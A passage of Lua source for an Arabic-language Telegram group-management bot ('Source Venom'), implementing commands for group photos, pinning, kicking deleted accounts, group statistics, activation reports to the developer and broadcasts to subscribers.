photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
tdcli_function ({ID = "ChangeChatPhoto",chat_id_ = msg.chat_id_,photo_ = getInputFile(photo_id) }, function(arg,data)   
if data.code_ == 3 then
send(msg.chat_id_, msg.id_,"??︙عذرا البوت ليس ادمن يرجى ترقيتي والمحاوله لاحقا") 
DevAbs:del(Venom..'Abs:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,"𖠧︙ليست لدي صلاحية تغير معلومات المجموعه يرجى التحقق من الصلاحيات") 
DevAbs:del(Venom..'Abs:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
else
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تغير صورة المجموعه'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
end
end,nil) 
DevAbs:del(Venom..'Abs:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
end 
end
if text and text:match("^ضع صوره$") and ChCheck(msg) or text and text:match("^وضع صوره$") and ChCheck(msg) then
Dev_Abs(msg.chat_id_,msg.id_, 1, '𖠧︙ارسل صورة المجموعه الان', 1, 'md')
DevAbs:set(Venom..'Abs:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
--     Source Venom     --
if text and text:match("^حذف الصوره$") and ChCheck(msg) or text and text:match("^مسح الصوره$") and ChCheck(msg) then
https.request("https://api.telegram.org/bot"..TokenBot.."/deleteChatPhoto?chat_id="..msg.chat_id_) 
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم حذف صورة المجموعه")  
return false  
end
--     Source Venom     --
if Manager(msg) then
if text and text:match("^الغاء تثبيت$") and ChCheck(msg) or text and text:match("^الغاء التثبيت$") and ChCheck(msg) then
if DevAbs:sismember(Venom.."Abs:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_Abs(msg.chat_id_,msg.id_, 1, "𖠧︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
if data.ID == "Ok" then
DevAbs:del(Venom..'Abs:PinnedMsg'..msg.chat_id_)
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم الغاء تثبيت الرساله'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
return false  
end
if data.code_ == 6 then
send(msg.chat_id_,msg.id_,"𖠧︙انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"𖠧︙ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
return false  
end
end,nil)
end
--     Source Venom     --
if text and text:match("^الغاء تثبيت الكل$") then  
if DevAbs:sismember(Venom.."Abs:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_Abs(msg.chat_id_,msg.id_, 1, "𖠧︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
if data.ID == "Ok" then
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم الغاء تثبيت الكل'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
https.request('https://api.telegram.org/bot'..TokenBot..'/unpinAllChatMessages?chat_id='..msg.chat_id_)
DevAbs:del(Venom.."Abs:PinnedMsg"..msg.chat_id_)
return false  
end
if data.code_ == 6 then
send(msg.chat_id_,msg.id_,"𖠧︙انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"𖠧︙ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
return false  
end
end,nil)
end
--     Source Venom     --
if text and text:match("^اعاده تثبيت$") and ChCheck(msg) or text and text:match("^اعاده التثبيت$") and ChCheck(msg) or text and text:match("^اعادة التثبيت$") and ChCheck(msg) then
if DevAbs:sismember(Venom.."Abs:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_Abs(msg.chat_id_,msg.id_, 1, "𖠧︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
local PinId = DevAbs:get(Venom..'Abs:PinnedMsg'..msg.chat_id_)
if PinId then
Pin(msg.chat_id_,PinId,0)
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم اعادة تثبيت الرساله'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
end end
end
--     Source Venom     --
if text == 'طرد المحذوفين' or text == 'مسح المحذوفين' or text == 'طرد الحسابات المحذوفه' or text == 'حذف المحذوفين' then  
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),offset_ = 0,limit_ = 1000}, function(arg,del)
for k, v in pairs(del.members_) do
tdcli_function({ID = "GetUser",user_id_ = v.user_id_},function(b,data) 
if data.first_name_ == false then
ChatKick(msg.chat_id_, data.id_)
end
end,nil)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم طرد المحذوفين")  
end,nil)
end
--     Source Venom     --
if text and text:match("^مسح المحظورين$") or text and text:match("^حذف المحظورين$") and ChCheck(msg) or text and text:match("^مسح المطرودين$") or text and text:match("^حذف المطرودين$") and ChCheck(msg) then
local function RemoveBlockList(extra, result)
if tonumber(result.total_count_) == 0 then 
Dev_Abs(msg.chat_id_, msg.id_, 0,'𖠧︙*لا يوجد محظورين*', 1, 'md')
DevAbs:del(Venom..'Abs:Ban:'..msg.chat_id_)
else
local x = 0
for x,y in pairs(result.members_) do
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = y.user_id_, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
DevAbs:del(Venom..'Abs:Ban:'..msg.chat_id_)
x = x + 1
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم حذف المحظورين")  
end
end
tdcli_function({ID="GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersKicked"},offset_ = 0,limit_ = 200}, RemoveBlockList, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_})    
end
end
--     Source Venom     --
if text and text:match("^معلومات المجموعه$") and ChCheck(msg) or text and text:match("^عدد الاعضاء$") and ChCheck(msg) or text and text:match("^عدد الكروب$") and ChCheck(msg) or text and text:match("^عدد الادمنيه$") and ChCheck(msg) or text and text:match("^عدد المحظورين$") and ChCheck(msg) then
local Muted = DevAbs:scard(Venom.."Abs:Muted:"..msg.chat_id_) or "0"
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙المجموعه ↫ ❨ '..dp.title_..' ❩\n𖠧︙الايدي ↫ ❨ '..msg.chat_id_..' ❩\n𖠧︙عدد الاعضاء ↫ ❨ *'..data.member_count_..'* ❩\n𖠧︙عدد الادمنيه ↫ ❨ *'..data.administrator_count_..'* ❩\n𖠧︙عدد المطرودين ↫ ❨ *'..data.kicked_count_..'* ❩\n𖠧︙عدد المكتومين ↫ ❨ *'..Muted..'* ❩\n𖠧︙عدد رسائل المجموعه ↫ ❨ *'..(msg.id_/2097152/0.5)..'* ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n', 1, 'md') 
end,nil)
end,nil)
end
--     Source Venom     --
if text and text:match('^كشف (-%d+)') then
local ChatId = text:match('كشف (-%d+)') 
if not SudoBot(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙للمطورين فقط', 1, 'md')
else
local ConstructorList = DevAbs:scard(Venom.."Abs:Constructor:"..ChatId) or 0
local BanedList = DevAbs:scard(Venom.."Abs:Ban:"..ChatId) or 0
local ManagerList = DevAbs:scard(Venom.."Abs:Managers:"..ChatId) or 0
local MutedList = DevAbs:scard(Venom.."Abs:Muted:"..ChatId) or 0
local TkeedList = DevAbs:scard(Venom.."Abs:Abs:Tkeed:"..ChatId) or 0
local AdminsList = DevAbs:scard(Venom.."Abs:Admins:"..ChatId) or 0
local VipList = DevAbs:scard(Venom.."Abs:VipMem:"..ChatId) or 0
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..ChatId))
if LinkGp.ok == true then LinkGroup = LinkGp.result else LinkGroup = 't.me/venom_source' end
tdcli_function({ID ="GetChat",chat_id_=ChatId},function(arg,dp)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = ChatId:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
if dp.id_ then
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,Abs) 
if Abs.first_name_ ~= false then
ConstructorAbs = "["..Abs.first_name_.."](T.me/"..(Abs.username_ or "venom_source")..")"
else 
ConstructorAbs = "حساب محذوف"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙المجموعه ↫ ["..dp.title_.."]("..LinkGroup..")\n𖠧︙الايدي ↫ ( `"..ChatId.."` )\n𖠧︙المنشئ ↫ "..ConstructorAbs.."\n𖠧︙عدد المدراء ↫ ( *"..ManagerList.."* )\n𖠧︙عدد المنشئين ↫ ( *"..ConstructorList.."* )\n𖠧︙عدد الادمنيه ↫ ( *"..AdminsList.."* )\n𖠧︙عدد المميزين ↫ ( *"..VipList.."* )\n𖠧︙عدد المحظورين ↫ ( *"..BanedList.."* )\n𖠧︙عدد المقيدين ↫ ( *"..TkeedList.."* )\n𖠧︙عدد المكتومين ↫ ( *"..MutedList.."* )", 1,"md")
end,nil)
end
end
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙لم تتم اضافتي بها لاقوم بكشفها", 1, "md")
end
end,nil)
end,nil)
end 
end
--     Source Venom     --
if text and text:match("^غادر (-%d+)$")  then
local Text = { string.match(text, "^(غادر) (-%d+)$")}
if not SecondSudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙للمطور الاساسي فقط', 1, 'md')
else 
tdcli_function({ID ="GetChat",chat_id_=Text[2]},function(arg,dp) 
if dp.id_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙المجموعه ↫ ["..dp.title_.."]\n𖠧︙تمت المغادره منها بنجاح", 1, "md")
Dev_Abs(Text[2], 0, 1, "𖠧︙بامر المطور تم مغادرة هذه المجموعه ", 1, "md")  
ChatLeave(dp.id_, Venom)
DevAbs:srem(Venom.."Abs:Groups", dp.id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙لم تتم اضافتي بها لاقوم بمغادرتها", 1, "md")
end 
end,nil)
end 
end
--     Source Venom     --
if text and text:match("^تعين عدد الاعضاء (%d+)$") and SecondSudo(msg) or text and text:match("^تعيين عدد الاعضاء (%d+)$") and SecondSudo(msg) then
local Num = text:match("تعين عدد الاعضاء (%d+)$") or text:match("تعيين عدد الاعضاء (%d+)$")
DevAbs:set(Venom..'Abs:Num:Add:Bot',Num) 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم وضع عدد الاعضاء ↫ *'..Num..'* عضو', 1, 'md')
end
--     Source Venom     --
if text == 'تفعيل البوت الخدمي' then 
if not Sudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙للمطور الاساسي فقط', 1, 'md')
else 
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تفعيل البوت الخدمي'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:del(Venom..'Abs:Lock:FreeBot'..Venom) 
end 
end
if text == 'تعطيل البوت الخدمي' then 
if not Sudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙للمطور الاساسي فقط', 1, 'md')
else 
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تعطيل البوت الخدمي'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:set(Venom..'Abs:Lock:FreeBot'..Venom,true) 
end 
end
if ChatType == 'sp' or ChatType == 'gp'  then
if text == 'تفعيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تفعيل اللعبه' and Manager(msg) and ChCheck(msg) then   
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تفعيل الالعاب بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:del(Venom..'Abs:Lock:Games'..msg.chat_id_) 
end
if text == 'تعطيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تعطيل اللعبه' and Manager(msg) and ChCheck(msg) then  
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تعطيل الالعاب بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:set(Venom..'Abs:Lock:Games'..msg.chat_id_,true)  
end
if text == "تفعيل الرابط" or text == "تفعيل جلب الرابط" then 
if Admin(msg) then
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تفعيل جلب رابط المجموعه'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:del(Venom.."Abs:Lock:GpLinks"..msg.chat_id_)
return false  
end
end
if text == "تعطيل الرابط" or text == "تعطيل جلب الرابط" then 
if Admin(msg) then
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تعطيل جلب رابط المجموعه'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:set(Venom.."Abs:Lock:GpLinks"..msg.chat_id_,"ok")
return false  
end
end
--     Source Venom     --
if text and text:match('^تفعيل$') and SudoBot(msg) and ChCheck(msg) then
if ChatType ~= 'sp' then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙المجموعه عاديه وليست خارقه لا تستطيع تفعيلي يرجى ان تضع سجل رسائل المجموعه ضاهر وليس مخفي ومن بعدها يمكنك رفعي ادمن ثم تفعيلي', 1, 'md')
return false
end
if msg.can_be_deleted_ == false then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙البوت ليس ادمن يرجى ترقيتي !', 1, 'md')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
if tonumber(data.member_count_) < tonumber(DevAbs:get(Venom..'Abs:Num:Add:Bot') or 0) and not SecondSudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙عدد اعضاء المجموعه اقل من ↫ *'..(DevAbs:get(Venom..'Abs:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,abbas) 
local admins = abbas.members_
for i=0 , #admins do
if abbas.members_[i].bot_info_ == false and abbas.members_[i].status_.ID == "ChatMemberStatusEditor" then
DevAbs:sadd(Venom..'Abs:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevAbs:srem(Venom..'Abs:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)
else
DevAbs:sadd(Venom..'Abs:Admins:'..msg.chat_id_, admins[i].user_id_)
end
if abbas.members_[i].status_.ID == "ChatMemberStatusCreator" then
DevAbs:sadd(Venom.."Abs:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevAbs:sadd(Venom.."Abs:AbsConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevAbs:srem(Venom.."Abs:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevAbs:srem(Venom.."Abs:AbsConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if DevAbs:sismember(Venom..'Abs:Groups',msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙المجموعه بالتاكيد مفعله', 1, 'md')
else
ReplyStatus(msg,result.id_,"ReplyBy","𖠧︙تم تفعيل المجموعه "..dp.title_)  
DevAbs:sadd(Venom.."Abs:Groups",msg.chat_id_)
if not DevAbs:get(Venom..'Abs:SudosGp'..msg.sender_user_id_..msg.chat_id_) and not SecondSudo(msg) then 
DevAbs:incrby(Venom..'Abs:Sudos'..msg.sender_user_id_,1)
DevAbs:set(Venom..'Abs:SudosGp'..msg.sender_user_id_..msg.chat_id_,"abs")
end
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NumMem = data.member_count_
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
DevAbs:set(Venom.."Abs:Groups:Links"..msg.chat_id_,LinkGroup) 
if not Sudo(msg) then
SendText(DevId,"𖠧︙تم تفعيل مجموعه جديده ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n𖠧︙بواسطة ↫ "..Name.."\n𖠧︙اسم المجموعه ↫ ["..NameChat.."]\n𖠧︙عدد اعضاء المجموعه ↫ ❨ *"..NumMem.."* ❩\n𖠧︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n𖠧︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n𖠧︙الوقت ↫ "..os.date("%I:%M%p").."\n𖠧︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end
end,nil)
end,nil)
end,nil)
end
if text == 'تعطيل' and SudoBot(msg) and ChCheck(msg) then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
if not DevAbs:sismember(Venom..'Abs:Groups',msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙المجموعه بالتاكيد معطله', 1, 'md')
else
ReplyStatus(msg,result.id_,"ReplyBy","𖠧︙تم تعطيل المجموعه "..dp.title_)  
DevAbs:srem(Venom.."Abs:Groups",msg.chat_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
DevAbs:set(Venom.."Abs:Groups:Links"..msg.chat_id_,LinkGroup) 
if not Sudo(msg) then
SendText(DevId,"𖠧︙تم تعطيل مجموعه جديده ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n𖠧︙بواسطة ↫ "..Name.."\n𖠧︙اسم المجموعه ↫ ["..NameChat.."]\n𖠧︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n𖠧︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n𖠧︙الوقت ↫ "..os.date("%I:%M%p").."\n𖠧︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end
end,nil)
end,nil)
end
end
--     Source Venom     --
if text and text:match("^المطور$") then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
LinkGroup = "𖠧︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩"
else
LinkGroup = '𖠧︙ليست لدي صلاحية الدعوه لهذه المجموعه !'
end
if not Sudo(msg) then
SendText(DevId,"𖠧︙هناك من بحاجه الى مساعده ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n𖠧︙الشخص ↫ "..Name.."\n𖠧︙اسم المجموعه ↫ ["..NameChat.."]\n𖠧︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n"..LinkGroup.."\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n𖠧︙الوقت ↫ "..os.date("%I:%M%p").."\n𖠧︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end,nil)
end,nil)
end
--     Source Venom     --
if text == 'جلب نسخه السورس' then
if not Sudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙للمطور الاساسي فقط ', 1, 'md')
else
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './Venom.lua', '𖠧︙نسخة ملف سورس ڤينوم',dl_cb, nil)
end end
--     Source Venom     --
if text == 'روابط الكروبات' or text == 'روابط المجموعات' then
if not SecondSudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙للمطور الاساسي فقط ', 1, 'md')
else
local List = DevAbs:smembers(Venom.."Abs:Groups")
if #List == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙لا توجد مجموعات مفعله', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙جاري ارسال نسخه تحتوي على ↫ '..#List..' مجموعه', 1, 'md')
local Text = "𖠧︙Source Venom\n𖠧︙File Bot Groups\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local GroupsManagers = DevAbs:scard(Venom.."Abs:Managers:"..v) or 0
local GroupsAdmins = DevAbs:scard(Venom.."Abs:Admins:"..v) or 0
local Groupslink = DevAbs:get(Venom.."Abs:Groups:Links" ..v)
Text = Text..k.." ↬ ⤈ \n𖠧︙Group ID ↬ "..v.."\n𖠧︙Group Link ↬ "..(Groupslink or "Not Found").."\n𖠧︙Group Managers ↬ "..GroupsManagers.."\n𖠧︙Group Admins ↬ "..GroupsAdmins.."\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
end
local File = io.open('GroupsBot.txt', 'w')
File:write(Text)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './GroupsBot.txt',dl_cb, nil)
io.popen('rm -rf ./GroupsBot.txt')
end
end
end
--     Source Venom     --
if text == "اذاعه خاص" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "↫ اذاعه خاص 𖠧" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if DevAbs:get(Venom.."Abs:Send:Bot"..Venom) and not SecondSudo(msg) then 
send(msg.chat_id_, msg.id_,"𖠧︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevAbs:setex(Venom.."Abs:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n𖠧︙للخروج ارسل ↫ ( الغاء ) \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
return false
end 
if DevAbs:get(Venom.."Abs:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevAbs:del(Venom.."Abs:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
List = DevAbs:smembers(Venom..'Abs:Users') 
if msg.content_.text_ then
for k,v in pairs(List) do 
AbsText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(List) do 
AbsText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
AbsText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
AbsText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
AbsText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
AbsText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
AbsText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
AbsText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم اذاعة "..AbsText.." بنجاح \n𖠧︙‏الى ↫ ❨ "..#List.." ❩ مشترك \n ✓", 1, 'md')
DevAbs:del(Venom.."Abs:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) 
end
--     Source Venom     --
if text == "اذاعه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "↫ اذاعه عام 𖠧" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if DevAbs:get(Venom.."Abs:Send:Bot"..Venom) and not SecondSudo(msg) then 
send(msg.chat_id_, msg.id_,"𖠧︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevAbs:setex(Venom.."Abs:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
